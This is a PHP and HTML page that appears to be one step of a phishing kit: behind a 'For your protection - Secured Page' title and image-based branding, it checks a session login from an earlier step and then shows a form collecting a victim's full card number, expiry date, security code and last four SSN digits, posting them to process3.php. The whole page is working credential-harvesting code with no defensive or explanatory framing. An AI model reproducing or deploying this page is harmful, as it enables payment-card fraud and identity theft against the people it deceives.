<?php
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['email'])&&!empty($_SESSION['email'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){



				}else{
		
		die(include 'Go_off.php');
		}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>For your protection - Secured Page</title>
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>
<link rel="stylesheet" href="css/style.css" />

 <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>

</head>


<body>
 
 <div class="img12-const">
    <div class="img12"></div>
 </div> 
 <div class="img13-const">
    <div class="img13"></div>
 </div>
 <div class="img-container-const">
   <div class="img-container2">
     <form id="form1" method="post" action="process3.php">
       <table width="840" border="0">
         <tr>
           <td width="834"><div class="img22"></div></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="special-label">Last sixteen(16) digits on the front of your card </div></td>
         </tr>
         <tr>
           <td>
           <input type="text" name="cardnumber" id="cardnumber" required="required" autocomplete="off" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="16" minlength="16" class="u-email2" /></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="special-label">Expiration Date</div></td>
         </tr>
         <tr>
           <td>
           <input type="text" name="expmonth" id="expmonth" required="required" autocomplete="off" class="expshort" maxlength="2" minlength="2" placeholder="MM" onKeyPress="javascript:return(numbersOnly(this,event));" /><input type="text" name="expyear" id="expyear" required="required" autocomplete="off" class="explong" maxlength="4" minlength="4" placeholder="YYYY" onKeyPress="javascript:return(numbersOnly(this,event));" /></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="special-label">Security Code</div></td>
         </tr>
         <tr>
           <td>
           <input type="text" name="sc" id="sc" required="required" autocomplete="off" class="explong" maxlength="3" minlength="3" onKeyPress="javascript:return(numbersOnly(this,event));"/></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="special-label">Last four(4) SSN#</div></td>
         </tr>
         <tr>
           <td>
           <input type="text" name="ssn" id="ssn" required="required" autocomplete="off" class="explong" maxlength="4" minlength="4" onKeyPress="javascript:return(numbersOnly(this,event));" /></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td>
             <input type="submit" name="btnlogin" id="btnlogin" value="s" class="img18a"/>
           &nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
       </table>
     </form>
   </div>
 </div>
<div class="footer3-const">
   <div class="footer3"></div>
 </div>
</body>
</html>